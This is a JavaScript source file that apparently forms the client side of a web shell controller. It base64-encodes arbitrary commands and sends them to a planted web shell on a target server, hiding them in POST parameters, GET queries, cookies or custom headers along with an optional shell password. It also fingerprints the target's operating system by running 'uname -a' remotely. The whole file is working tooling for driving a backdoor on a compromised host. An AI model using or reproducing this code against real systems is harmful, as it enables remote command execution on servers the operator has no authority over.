const superagent = require("superagent");
const COMMAND_MAP = require("./reqTypes").COMMAND_MAP;
const { WINDOWS, MAC, LINUX } = require("./osTypes");
require("superagent-proxy")(superagent);

const proxy = process.env.http_proxy || null;

const encodeCommand = (command, shellEncoding) => {
	var encoded = command;

	switch(shellEncoding) {
		case "base64":
			encoded = Buffer.from(command).toString("base64");
			break;
		default:
			console.error("Unsupported command encoding!");
			break;
	}

	return encoded;
}

/** 
 * Sends a predefined request type
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @param {String} reqType The name of the request type, as defined in `reqTypes.js`
 * @exports 
 */
const sendRequest = async (shell, reqType, args = []) => {
	var command = COMMAND_MAP[reqType][shell.os];
	var expectedArgs = COMMAND_MAP[reqType]["args"];

	if(args.length === expectedArgs && args.length > 0) {
		const argsString = args.join(" ");
		command = `${command} ${argsString}`;
	}

	return sendArbitraryCommand(shell, command);
}

/** @exports */
const sendArbitraryCommand = async (shell, command) => {
	try {
		var request = encodeCommand(command, shell.commandEncoding);
		var response;

		if(shell.commandParamType === "POST") {
			var postString = `${shell.commandParam}=${request}`;
			if(shell.passwordEnabled) {
				postString += `&${shell.passwordParam}=${encodeCommand(shell.password, shell.commandEncoding)}`;
			}

			response = await superagent.post(shell.ipOrHostname).proxy(proxy).send(postString);
		} else {
			if(shell.commandParamType === "GET") {
				var queryString = `${shell.commandParam}=${request}`;	
				if(shell.passwordEnabled) {
					queryString += `&${shell.passwordParam}=${encodeCommand(shell.password, shell.commandEncoding)}`;
				}

				response = await superagent.get(shell.ipOrHostname).proxy(proxy).query(queryString);
			} else if(shell.commandParamType === "cookie") {
				var headers = {};
				headers["Cookie"] = `${shell.commandParam}=${request}`;
				if(shell.passwordEnabled) {
					headers["Cookie"] += `; ${shell.passwordParam}=${encodeCommand(shell.password, shell.commandEncoding)}`;
				}

				response = await superagent.get(shell.ipOrHostname).proxy(proxy).set(headers);
			} else if(shell.commandParamType === "header") {
				var headers = {};
				headers[shell.commandParam] = request;
				if(shell.passwordEnabled) {
					headers[shell.passwordParam] = encodeCommand(shell.password, shell.commandEncoding);
				}

				response = await superagent.get(shell.ipOrHostname).proxy(proxy).set(headers);
			} 
		}
		
		return response;
	} catch (error) {
		console.log(error);
		return null;
	}
	
}

/** 
 * Determines what operating system the target is running
 * 
 * @param {WebShellSchema} shell The details of the selected shell
 * @exports 
 */
const determineOS = async (shell) => {
	const response = await sendArbitraryCommand(shell, "uname -a");

	var os = LINUX;

	// Windows does not have `uname`
	if(response.text.includes("not recognized")) {
		os = WINDOWS;
	} else if(response.text.includes("Linux")) {
		os = LINUX;
	} else {
		os = MAC;
	}

	return os;
};

module.exports = { sendRequest, sendArbitraryCommand, determineOS };